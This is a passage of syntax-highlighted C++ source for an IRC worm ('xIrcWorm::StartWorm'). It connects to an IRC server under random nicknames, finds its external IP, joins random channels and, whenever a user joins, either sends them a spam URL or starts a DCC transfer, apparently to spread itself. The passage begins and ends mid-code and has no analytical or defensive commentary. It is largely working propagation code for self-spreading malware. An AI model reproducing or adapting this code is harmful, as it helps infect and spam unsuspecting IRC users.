        </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">recvied</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">

        </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">recvied</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc4">0xD</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//recv &amp; return
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">xIrcWorm</span><span class="sc10">::</span><span class="sc11">StartWorm</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">wsd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">LPHOSTENT</span><span class="sc0">   </span><span class="sc11">xhostnt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">xsin</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">],</span><span class="sc11">realname</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">],</span><span class="sc11">nick</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">],*</span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">ping_id</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szList</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">],</span><span class="sc11">response</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">],</span><span class="sc11">kicked_nick</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">],</span><span class="sc11">rndstr</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">SOCKADDR</span><span class="sc0"> </span><span class="sc11">xsockaddr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">SizeOfxsa</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">xsockaddr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SpamInfo</span><span class="sc0"> </span><span class="sc11">xSpamInfo</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DCCInfo</span><span class="sc0">  </span><span class="sc11">xDccInfo</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">),&amp;</span><span class="sc11">wsd</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">Irc_Socket</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc11">IPPROTO_TCP</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">//create socket
</span><span class="sc0">    
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xhostnt</span><span class="sc10">=</span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">Irc_Server</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">//dns irc server
</span><span class="sc0">            
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">xhostnt</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">xsin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc10">=</span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">xsin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc10">=</span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">Irc_Port</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">xsin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">=*((</span><span class="sc11">LPIN_ADDR</span><span class="sc10">)*</span><span class="sc11">xhostnt</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,(</span><span class="sc11">LPSOCKADDR</span><span class="sc10">)&amp;</span><span class="sc11">xsin</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">))!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//connect server
</span><span class="sc0">                </span><span class="sc10">{</span><span class="sc0">

                    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">3000</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">//sleep 3 seconds
</span><span class="sc0">                    </span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
                    
                    </span><span class="sc11">RandomString</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc4">8</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">RandomString</span><span class="sc10">(</span><span class="sc11">rndstr</span><span class="sc10">,</span><span class="sc4">5</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">GetRndUserStr</span><span class="sc10">(</span><span class="sc11">realname</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">realname</span><span class="sc10">,</span><span class="sc11">rndstr</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">GetRndUserStr</span><span class="sc10">(</span><span class="sc11">nick</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"USER %s 8 * :%s\r\n"</span><span class="sc10">,</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc11">realname</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"NICK %s\r\n"</span><span class="sc10">,</span><span class="sc11">nick</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"PING :"</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">        </span><span class="sc2">//some servers sending ping right after user registion
</span><span class="sc0">                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">p1</span><span class="sc10">+=</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">do</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">ping_id</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
                            </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0xd</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"PONG %s\r\n"</span><span class="sc10">,</span><span class="sc11">ping_id</span><span class="sc10">);</span><span class="sc0">         </span><span class="sc2">//build PONG command
</span><span class="sc0">                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">//send PONG command
</span><span class="sc0">
                        </span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">                              </span><span class="sc2">//recive message from server
</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"001"</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
        
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">getsockname</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,&amp;</span><span class="sc11">xsockaddr</span><span class="sc10">,&amp;</span><span class="sc11">SizeOfxsa</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">

                            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">BYTE</span><span class="sc10">)</span><span class="sc11">xsockaddr</span><span class="sc10">.</span><span class="sc11">sa_data</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]==</span><span class="sc4">192</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//is LAN ip ?
</span><span class="sc0">                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc2">//if we got lan ip,try to get the ip from the irc server
</span><span class="sc0">                                </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"USERIP %s\r\n"</span><span class="sc10">,</span><span class="sc11">nick</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                            
                                </span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"@"</span><span class="sc10">);</span><span class="sc0">
                                
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                    </span><span class="sc5">do</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">xIp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                        </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&gt;</span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0x0D</span><span class="sc10">);</span><span class="sc0">

                                    </span><span class="sc11">xIp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

                                    </span><span class="sc11">OverRideIP</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">

                        </span><span class="sc10">}</span><span class="sc0">


                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">szList</span><span class="sc10">,</span><span class="sc6">"LIST &gt;%d\r\n"</span><span class="sc10">,</span><span class="sc0">
                            </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">)+(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">));</span><span class="sc0"> </span><span class="sc2">// build a list command
</span><span class="sc0">    

                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">szList</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">szList</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                        
                        </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc5">do</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">

                            </span><span class="sc5">do</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                            </span><span class="sc5">do</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc11">response</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc11">response</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">response</span><span class="sc10">,</span><span class="sc6">"322"</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">// RPL_LIST
</span><span class="sc0">                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc5">do</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                </span><span class="sc5">do</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">channels_list</span><span class="sc10">[</span><span class="sc11">number_of_channels</span><span class="sc10">][</span><span class="sc11">i</span><span class="sc10">]=*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">//copy channel name
</span><span class="sc0">                                
                                </span><span class="sc11">channels_list</span><span class="sc10">[</span><span class="sc11">number_of_channels</span><span class="sc10">][</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

                                </span><span class="sc11">number_of_channels</span><span class="sc10">++;</span><span class="sc0">

                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">number_of_channels</span><span class="sc10">&gt;</span><span class="sc4">74</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">szList</span><span class="sc10">,</span><span class="sc6">"LIST STOP\r\n"</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">szList</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">szList</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            
                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">response</span><span class="sc10">,</span><span class="sc6">"323"</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//RPL_LISTEND
</span><span class="sc0">                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            

                            </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">);</span><span class="sc0">

                        
                        

                        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">    </span><span class="sc2">//join 6 random channels
</span><span class="sc0">                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"JOIN %s\r\n"</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">channels_list</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">number_of_channels</span><span class="sc10">]);</span><span class="sc0">
                            </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">


                        </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">myrecv</span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">


                        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">


                            </span><span class="sc2">//process ping message
</span><span class="sc0">                            </span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"PING :"</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">p1</span><span class="sc10">+=</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">do</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">ping_id</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
                                    </span><span class="sc11">p1</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p1</span><span class="sc10">!=</span><span class="sc4">0xd</span><span class="sc10">);</span><span class="sc0">
    
                                </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"PONG %s\r\n"</span><span class="sc10">,</span><span class="sc11">ping_id</span><span class="sc10">);</span><span class="sc2">//build PONG command
</span><span class="sc0">                                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">Irc_Socket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc2">//send PONG command
</span><span class="sc0">                            
                                </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">do_recv</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">

                            </span><span class="sc2">//detect part / join
</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"JOIN"</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc2">//process JOIN
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetNickFromBuffer</span><span class="sc10">(</span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">nick2spam</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">nick</span><span class="sc10">,</span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">nick2spam</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)&gt;</span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//select between spam or dcc
</span><span class="sc0">                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">=</span><span class="sc11">Irc_Socket</span><span class="sc10">;</span><span class="sc0">
                                            </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">AutoSpam</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">OverRideIP</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">Oip</span><span class="sc10">,</span><span class="sc11">xIp</span><span class="sc10">);</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc5">else</span><span class="sc0">
                                                </span><span class="sc11">xSpamInfo</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

                                            </span><span class="sc11">XThread</span><span class="sc10">(</span><span class="sc11">SendSpamUrl</span><span class="sc10">,&amp;</span><span class="sc11">xSpamInfo</span><span class="sc10">);</span><span class="sc0">
                                    
                                        </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc5">else</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc11">xDccInfo</span><span class="sc10">.</span><span class="sc11">xsocket</span><span class="sc10">=</span><span class="sc11">Irc_Socket</span><span class="sc10">;</span><span class="sc0">
                                            
                                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">OverRideIP</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc11">xDccInfo</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">xDccInfo</span><span class="sc10">.</span><span class="sc11">Oip</span><span class="sc10">,</span><span class="sc11">xIp</span><span class="sc10">);</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc5">else</span><span class="sc0">
                                                </span><span class="sc11">xDccInfo</span><span class="sc10">.</span><span class="sc11">OveRideIp</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

